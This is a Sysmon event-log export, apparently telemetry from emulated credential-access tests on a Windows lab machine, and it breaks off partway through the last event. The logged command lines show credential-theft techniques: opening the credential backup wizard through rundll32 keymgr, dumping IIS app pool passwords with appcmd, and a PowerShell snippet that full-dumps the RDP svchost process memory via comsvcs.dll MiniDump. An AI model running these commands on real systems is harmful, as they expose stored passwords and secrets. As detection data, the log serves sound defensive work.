Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,EventID,EventRecordID,FileVersion,Hashes,Image,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,RuleName,SystemTime,TargetFilename,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\credwiz.exe R,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Credential Backup and Restore Wizard,1,19674,10.0.22621.2506 (WinBuild.160101.0800),"MD5=CADD55BA4888B7687D0C484BD3BFD4D2,SHA256=D46F3609D736109CBADD46648B3092EB6FE6A1D423B716537A643E78430977EB,IMPHASH=E80772FEA0650454A7ED9F9F4597B0D8",C:\Windows\System32\credwiz.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,credwiz.exe,"""C:\Windows\system32\rundll32.exe"" keymgr,KRShowKeyMgr",C:\Windows\System32\rundll32.exe,{f57bd86a-40d3-658c-9a02-000000000f00},10620,WINDEV2309EVAL\User,{f57bd86a-40da-658c-9b02-000000000f00},3588,5528,Microsoft® Windows® Operating System,-,2023-12-27T15:20:58.7632874Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:58.759,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:58.7632874Z""/>
      
            
      <EventRecordID>19674</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:58.759</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40da-658c-9b02-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">5528</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\credwiz.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Credential Backup and Restore Wizard</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">credwiz.exe</Data>
      
            
      <Data Name=""CommandLine"">C:\Windows\system32\credwiz.exe R</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=CADD55BA4888B7687D0C484BD3BFD4D2,SHA256=D46F3609D736109CBADD46648B3092EB6FE6A1D423B716537A643E78430977EB,IMPHASH=E80772FEA0650454A7ED9F9F4597B0D8</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-40d3-658c-9a02-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">10620</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\rundll32.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""C:\Windows\system32\rundll32.exe"" keymgr,KRShowKeyMgr</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\rundll32.exe"" keymgr,KRShowKeyMgr",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows host process (Rundll32),1,19673,10.0.22621.1 (WinBuild.160101.0800),"MD5=57A6B4BDF247C1A6CA08AC09A8F9B742,SHA256=98D37EFF504A7ADB864131EA4A042AAF4D79C4356960A8AB2FA656CC59AEC014,IMPHASH=5C68DE198B5D2DD5C1129782AD19676C",C:\Windows\System32\rundll32.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,RUNDLL32.EXE,"""powershell.exe"" & {rundll32.exe keymgr,KRShowKeyMgr}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-40d2-658c-9802-000000000f00},4188,WINDEV2309EVAL\User,{f57bd86a-40d3-658c-9a02-000000000f00},3588,10620,Microsoft® Windows® Operating System,-,2023-12-27T15:20:51.6243901Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:51.623,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:51.6243901Z""/>
      
            
      <EventRecordID>19673</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:51.623</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40d3-658c-9a02-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10620</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows host process (Rundll32)</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">RUNDLL32.EXE</Data>
      
            
      <Data Name=""CommandLine"">""C:\Windows\system32\rundll32.exe"" keymgr,KRShowKeyMgr</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=57A6B4BDF247C1A6CA08AC09A8F9B742,SHA256=98D37EFF504A7ADB864131EA4A042AAF4D79C4356960A8AB2FA656CC59AEC014,IMPHASH=5C68DE198B5D2DD5C1129782AD19676C</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-40d2-658c-9802-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">4188</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {rundll32.exe keymgr,KRShowKeyMgr}</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:20:51.031,,,11,19672,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-40d2-658c-9802-000000000f00},3588,4188,,-,2023-12-27T15:20:51.0456629Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_kgir5zk5.1xc.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:51.031,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:51.0456629Z""/>
      
            
      <EventRecordID>19672</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:51.031</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40d2-658c-9802-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4188</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_kgir5zk5.1xc.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:20:51.031</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {rundll32.exe keymgr,KRShowKeyMgr}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19671,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},3288,-,{f57bd86a-40d2-658c-9802-000000000f00},3588,4188,Microsoft® Windows® Operating System,-,2023-12-27T15:20:50.9424463Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:50.941,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:50.9424463Z""/>
      
            
      <EventRecordID>19671</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:50.941</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40d2-658c-9802-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4188</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {rundll32.exe keymgr,KRShowKeyMgr}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">3288</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:20:49.938,,,11,19670,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-40d1-658c-9602-000000000f00},3588,9836,,-,2023-12-27T15:20:49.9399028Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_ujrc5ie3.1sk.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:49.938,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:49.9399028Z""/>
      
            
      <EventRecordID>19670</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:49.938</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40d1-658c-9602-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">9836</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_ujrc5ie3.1sk.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:20:49.938</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {C:\Windows\System32\inetsrv\appcmd.exe list apppool /config}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19669,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},3288,-,{f57bd86a-40d1-658c-9602-000000000f00},3588,9836,Microsoft® Windows® Operating System,-,2023-12-27T15:20:49.8359250Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:49.834,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:49.8359250Z""/>
      
            
      <EventRecordID>19669</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:49.834</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40d1-658c-9602-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">9836</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {C:\Windows\System32\inetsrv\appcmd.exe list apppool /config}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">3288</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:20:48.655,,,11,19668,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-40d0-658c-9402-000000000f00},3588,10572,,-,2023-12-27T15:20:48.6608234Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_nsyv2qvk.ow4.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:48.655,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:48.6608234Z""/>
      
            
      <EventRecordID>19668</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:48.655</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40d0-658c-9402-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10572</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_nsyv2qvk.ow4.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:20:48.655</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19667,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},3288,-,{f57bd86a-40d0-658c-9402-000000000f00},3588,10572,Microsoft® Windows® Operating System,-,2023-12-27T15:20:48.5523261Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:48.551,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:48.5523261Z""/>
      
            
      <EventRecordID>19667</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:48.551</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40d0-658c-9402-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10572</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">3288</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\System32\rundll32.exe"" C:\windows\System32\comsvcs.dll MiniDump 496 C:\Users\User\AppData\Local\Temp\svchost-exe.dmp full",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows host process (Rundll32),1,19666,10.0.22621.1 (WinBuild.160101.0800),"MD5=57A6B4BDF247C1A6CA08AC09A8F9B742,SHA256=98D37EFF504A7ADB864131EA4A042AAF4D79C4356960A8AB2FA656CC59AEC014,IMPHASH=5C68DE198B5D2DD5C1129782AD19676C",C:\Windows\System32\rundll32.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,RUNDLL32.EXE,"""powershell.exe"" & {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-40ce-658c-9102-000000000f00},7296,WINDEV2309EVAL\User,{f57bd86a-40d0-658c-9302-000000000f00},3588,6128,Microsoft® Windows® Operating System,-,2023-12-27T15:20:48.3007622Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:20:48.299,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:20:48.3007622Z""/>
      
            
      <EventRecordID>19666</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:20:48.299</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-40d0-658c-9302-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">6128</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows host process (Rundll32)</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">RUNDLL32.EXE</Data>
      
            
      <Data Name=""CommandLine"">""C:\Windows\System32\rundll32.exe"" C:\windows\System32\comsvcs.dll MiniDump 496 C:\Users\User\AppData\Local\Temp\svchost-exe.dmp full</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
